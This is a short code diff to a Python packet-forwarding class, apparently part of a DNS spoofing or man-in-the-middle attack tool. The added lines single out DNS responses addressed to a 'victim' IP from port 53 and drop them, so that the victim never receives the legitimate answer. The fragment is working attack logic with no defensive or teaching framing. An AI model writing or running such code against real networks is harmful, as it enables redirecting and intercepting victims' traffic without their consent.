@@ -61,6 +61,13 @@ class PacketForwarder:
             if self.packet_count % 100 == 0:
                 print(f"[*] Processed {self.packet_count} packets")
             
+            # Check if packet is DNS response from server to victim
+            if pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[DNS].qr == 1:
+                if pkt[IP].dst == self.victim_ip and pkt[UDP].sport == 53:
+                    print("[*] Dropping legitimate DNS response from server")
+                    packet.drop()  # Drop legitimate DNS response so victim never sees it
+                    return
+            
             packet.accept()
 
         except Exception as e:
